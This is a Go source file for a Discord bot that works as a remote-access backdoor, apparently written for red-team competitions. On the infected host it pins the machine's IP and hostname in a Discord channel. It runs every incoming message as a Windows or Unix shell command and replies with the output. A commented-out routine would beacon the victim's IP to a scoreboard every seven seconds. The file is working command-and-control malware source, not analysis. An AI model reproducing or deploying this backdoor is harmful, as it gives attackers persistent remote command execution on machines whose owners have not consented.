package main

import (
	"context"
	"os"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"net/http"
	"bytes"
	"strings"
	"time"
	"encoding/json"
	"gopkg.in/yaml.v3"
	"github.com/andersfylling/disgord"
	creator "./discord"
)

var categoryid disgord.Snowflake
var con = context.Background()
var debug = true

//Config is used to represent the config file
type Config struct {
    Discord struct {
        Token string `yaml:"bot_token"`
        ID int `yaml:"server_id"`
	} `yaml:"discord"`
	
    Channel struct {
        OS string `yaml:"category_name"`
        TeamNum string `yaml:"channel_name"`
    } `yaml:"channel"`
}

// PwnBoard json post request 
type PwnBoard struct {
	IPs  string `json:"ip"`
	Type string `json:"type"`
}

func processError(err error){
	fmt.Println("Error: ", err)
}

func userInput(s disgord.Session, evt *disgord.MessageCreate){
	msg := evt.Message

	if !evt.Message.Author.Bot{
		if msg.Content == "ping" {
			s.SendMsg(con, msg.ChannelID, "I am alive. Thanks")	
		}else if msg.Content == "die"{ //TODO: Still stop all program, we don't want that
			// Delete Channel
			s.DeleteChannel(con, msg.ChannelID)
		}else if msg.Content == "install" {
			//Install stuff based on OS
		}else{
			//run os command and send results
			output := shellRun(msg.Content)
			if output == ""{
				msg.Reply(con, s, "Command didn't return anything")
			}else{
				msg.Reply(con, s, prettyOutput(output))
			}
		}
	}else{
		// Do nothing
		// fmt.Println("It is a bot")
	}
}

// shellRun runs commands based on OS
// CMD(for now) --> Windows
// SH --> Linux based machine, most of them have sh installed
//TODO: Deal with large output
func shellRun(cmd string) string{
	// special cd
	splittedCommand := strings.Fields(string(cmd))
	args := splittedCommand[1:]
	// fmt.Println("args ", args)
	if splittedCommand[0] == "cd" {
		os.Chdir(strings.Join(args, ""))
		return "Changed directory Successfully"
	}

	var shell, flag string
	if runtime.GOOS == "windows"{
		shell = "cmd"
		flag = "/c"
	} else{
		shell = "/bin/sh"
		flag = "-c"
	}

	out, err := exec.Command(shell, flag, cmd).Output()
	if err != nil {
		return "Invalid command"
	}

	return string(out)
}

// updatepwnBoard sends a post request to pwnboard with the IP
// Request is done every 7 seconds
// ip: Victim's IP
func updatepwnBoard(ip string){
	for {

		time.Sleep(7 * time.Second)

		// url := "http://pwnboard.win/generic"
		url := "http://localhost:8080"

     	// Create the struct
     	data := PwnBoard{
        	IPs:  ip,
        	Type: "sexyPotat0",
     	}

    	// Marshal the data
    	sendit, err := json.Marshal(data)
    	if err != nil {
        	fmt.Println("\n[-] ERROR SENDING POST:", err)
        	return
    	}

    	// Send the post to pwnboard
    	resp, err := http.Post(url, "application/json", bytes.NewBuffer(sendit))
    	if err != nil {
        	fmt.Println("[-] ERROR SENDING POST:", err)
        	return
    	}

		defer resp.Body.Close()
	}
}

// getIP gets the victim's IP
func getIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}

	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

// PrettyOutput beautifies output by putting ``` in first and back of the string
// out: Output message
func prettyOutput(out string) string {
	return "```" + out + "```"
}

// Entry Point
// Reads the config file
// Make a connection to the discord server
// Create the OS type as category
// Create teams under the category
// Gets systeminfo and pins it
// Also updates pwnboard every 7 seconds because why not
func main(){
	// Config file
	f, err := os.Open("config.yaml")
	if err != nil {
		processError(err)
	}
	defer f.Close()

	var config Config
	decoder := yaml.NewDecoder(f)
	err = decoder.Decode(&config)
	if err != nil {
	    processError(err)
	}

	client := disgord.New(disgord.Config{
		BotToken: config.Discord.Token,
		Logger: disgord.DefaultLogger(false),
	})

	id := config.Discord.ID
	categoryName := config.Channel.OS
	channelName := config.Channel.TeamNum

	// Pwnboard test
	// go updatepwnBoard(getIP()) <-----------------------Pwnboard stuff

	defer client.StayConnectedUntilInterrupted(con)

	guild, _ := client.GetGuild(con, disgord.Snowflake(id))

	// list of channels
	channels, _ := client.GetGuildChannels(con, guild.ID)

	//create catogory
	category := creator.CreateCategory(client, id, channels, categoryName)
	categoryid = category.ID

	//general channel
	// creator.CreateChannel(client, id,  category, "general")

	//create channel
	subchan := creator.CreateChannel(channels, client, id,  category, channelName)


	// sending system ingo
	hostname , _ := os.Hostname()
	systeminfo := ""
	systeminfo += "IP: " + getIP() + "\n"
	systeminfo += "Hostname: " + hostname + "\n"
	systeminfo += "OS: UNKNOW\n"

	systeminfomsg, _ := client.SendMsg(con, subchan.ID, prettyOutput(systeminfo))
	client.PinMessage(con, systeminfomsg)

	client.On(disgord.EvtMessageCreate, userInput)
}
